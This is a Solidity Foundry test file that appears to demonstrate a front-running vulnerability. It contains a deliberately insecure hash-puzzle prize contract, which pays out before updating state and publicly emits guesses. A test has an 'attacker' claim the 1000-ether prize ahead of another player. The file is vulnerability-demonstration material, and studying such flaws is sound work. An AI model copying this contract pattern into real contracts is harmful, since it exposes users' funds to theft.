// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";

contract TestableFindThisHash {
    bytes32 public hash;
    uint256 public totalWinters;
    uint256 public totalAttempts;
    mapping(address => uint256) public playerAttempts;
    mapping(address => bool) public hasWon;
    event PrizeClaimed(address winner, uint256 amount);
    event HashAttempt(address player, string attempt, bool success);

    constructor(bytes32 _hash) payable {
        hash = _hash;
    }

    function solve(string calldata solution) public {
        require(hash == sha256(bytes(solution)), "Incorrect solution");
        payable(msg.sender).transfer(1000 ether);
        totalWinters++;
        hasWon[msg.sender] = true;
        emit PrizeClaimed(msg.sender, 1000 ether);
    }

    function attemptHash(string calldata guess) external {
        totalAttempts++;
        playerAttempts[msg.sender]++;
        bool correct = hash == sha256(bytes(guess));
        emit HashAttempt(msg.sender, guess, correct);
        if (correct) {
            solve(guess);
        }
    }

    function getPlayerStats(address player) external view returns (uint attempts, bool winner) {
        return (playerAttempts[player], hasWon[player]);
    }
}

contract FindThisHashTest is Test {
    TestableFindThisHash game;
    address alice = address(0x1);
    address attacker = address(0x2);
    string constant SOLUTION = "Ethereum";
    uint256 constant PRIZE = 1000 ether;
    bytes32 solutionHash;

    function setUp() public {
        // Compute solution hash
        solutionHash = sha256(bytes(SOLUTION));
        
        // Deploy contract with prize amount and solution hash
        game = new TestableFindThisHash{value: PRIZE}(solutionHash);
    }

    function testFrontRunningVulnerability() public {
        // Fund Alice and Attacker
        vm.deal(alice, 1 ether);
        vm.deal(attacker, 1 ether);

        console.log("--- BEFORE-Trigger Attack ---");
        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 contractBalanceBefore = address(game).balance;
        (, bool attackerWonBefore) = game.getPlayerStats(attacker);
        uint256 totalWinnersBefore = game.totalWinters();

        console.log("Attacker ETH Before: %d", attackerBalanceBefore);
        console.log("Contract ETH Before: %d", contractBalanceBefore);
        console.log("Attacker Won Before: %s", attackerWonBefore ? "true" : "false");
        console.log("Total Winners Before: %d", totalWinnersBefore);

        console.log("--- Trigger Attack (Front-Running) ---");
        vm.prank(attacker);
        game.attemptHash(SOLUTION);

        console.log("--- AFTER-Trigger Attack ---");
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 contractBalanceAfter = address(game).balance;
        (, bool attackerWonAfter) = game.getPlayerStats(attacker);
        uint256 totalWinnersAfter = game.totalWinters();
        uint256 attackerProfit = attackerBalanceAfter - attackerBalanceBefore;
        uint256 contractLoss = contractBalanceBefore - contractBalanceAfter;

        console.log("Attacker ETH After: %d (Profit: %d)", attackerBalanceAfter, attackerProfit);
        console.log("Contract ETH After: %d (Loss: %d)", contractBalanceAfter, contractLoss);
        console.log("Attacker Won After: %s", attackerWonAfter ? "true" : "false");
        console.log("Total Winners After: %d", totalWinnersAfter);

        bool fundsTransfered = (attackerProfit == PRIZE) && 
                              (contractLoss == PRIZE) &&
                              (contractBalanceAfter == 0);
        bool stateChanged = attackerWonAfter && 
                           !attackerWonBefore &&
                           (totalWinnersAfter - 1 == totalWinnersBefore);
        
        console.log("Verdict:");
        console.log("Funds Transfer? %s", fundsTransfered ? "PASS" : "FAIL");
        console.log("State Changed? %s", stateChanged ? "PASS" : "FAIL");

        // Verify attacker received prize (1000 ether) + initial 1 ether
        assertEq(attacker.balance, PRIZE + 1 ether, "Attacker should receive prize");
        assertEq(address(game).balance, 0, "Contract balance should be zero");

        // Verify attacker is marked as winner
        (, bool attackerWon) = game.getPlayerStats(attacker);
        assertTrue(attackerWon, "Attacker should be marked as winner");

        // Alice's transaction fails due to insufficient contract balance
        console.log("--- Testing Alice's Attempt (Expected Fail) ---");
        uint256 aliceBalanceBefore = alice.balance;
        vm.prank(alice);
        vm.expectRevert();
        game.attemptHash(SOLUTION);

        console.log("Alice ETH After failed attempt: %d", alice.balance);
        (, bool aliceWon) = game.getPlayerStats(alice);
        console.log("Alice Won After: %s", aliceWon ? "true" : "false");

        // Verify Alice did not receive prize
        assertEq(alice.balance, aliceBalanceBefore, "Alice should not receive prize");
        assertFalse(aliceWon, "Alice should not be marked as winner");

        // Final vulnerability verdict
        if (fundsTransfered && stateChanged) {
            console.log("Vulnerability Exists: Attacker successfully front-ran and claimed the prize");
        } else {
            console.log("Vulnerability not Exist: Incomplete state transition during attack");
        }
    }
}